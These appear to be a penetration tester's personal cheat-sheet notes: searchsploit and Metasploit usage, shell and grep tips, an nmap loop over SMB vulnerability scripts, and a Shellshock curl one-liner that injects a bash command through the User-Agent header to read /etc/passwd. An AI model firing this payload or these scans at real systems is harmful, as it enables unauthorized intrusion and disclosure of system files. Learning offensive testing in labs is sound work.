searchsploit SOMETHING

shellshock

curl -H "user-agent:() {:;};echo; /bin/bash -c 'cat /etc/passwd'"

to copy into working directory
searchsploit -m EXPLOIT

Test blind command injection
on target box
ping IP
on kali box
tcpdump -i tun0

Msfdb run - start db and run msfconsole

You can use this: $(!!) to recompute (not re-use) the output of the last command.
  Example: cp `!!` .
  
when ifconfig is not available, use ip addr, or sbin/ifconfig

Recursive grep search for version number used to identify which files show version number
  awk sorting by field : and printing first result
grep -R version_number . | awk -F: '{print $1}' | uniq

less filename 

Can create multiple subsequent directories
mkdir -p one/two

Script to check every SMB vulnerability 
for vul in $(find / -name smb*vuln*.nse | cut -d"/" -f 6); do nmap -v -p 139,445 --script=$vul -iL smb_server_all.txt -oN smb_vulns_$vul.txt; done 

Always use full path to execute something 

SNIFF SMB version ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' & smbclient -L [IP] 
